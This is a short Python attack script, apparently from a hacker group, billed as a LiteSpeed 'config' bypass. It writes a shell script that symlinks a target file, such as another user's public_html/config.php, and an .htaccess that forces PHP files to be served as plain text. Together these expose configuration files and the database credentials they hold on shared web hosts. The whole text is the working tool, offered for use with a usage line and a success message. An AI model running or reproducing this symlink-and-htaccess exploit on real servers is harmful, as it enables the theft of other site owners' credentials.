#/
#* Project : LiteSpeed Config Fucker
#* Author  : M3T4L
#* Twitter : M3T4LSEC
#* TurkicHackersRulez
#/

import os,sys

try:
	os.system("rm -rf Tur4nizm")
	os.mkdir("Tur4nizm")
	os.system("chmod +x Tur4nizm")
	os.chdir("Tur4nizm")
	with open("lite.sh","w") as bypass:
		bypass.write("ln -s " + sys.argv[1] + " README")
	with open(".htaccess","w") as htaccess:
		htaccess.write("OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI\nOptions Indexes FollowSymLinks\nForceType text/plain\nAddType text/plain .php\nAddType text/plain .html\nAddType text/html .shtml\nAddType txt .php\nAddHandler server-parsed .php\nAddHandler txt .php\nAddHandler txt .html\nAddHandler txt .shtml\nOptions All\nReadMeName README")
	os.system("chmod +x lite.sh")
	os.system("./lite.sh")
	os.system("rm -rf lite.sh")
	print("#/\n#* Project : LiteSpeed Config Fucker\n#* Author  : M3T4L\n#* Twitter : M3T4LSEC\n#* TurkicHackersRulez\n#/\n\n[+] Bypassed Successfully!\n[!] Please check Lite0day folder!")
except:
	print("Please enter your target file! Use : python amk.py /home/user/public_html/config.php")
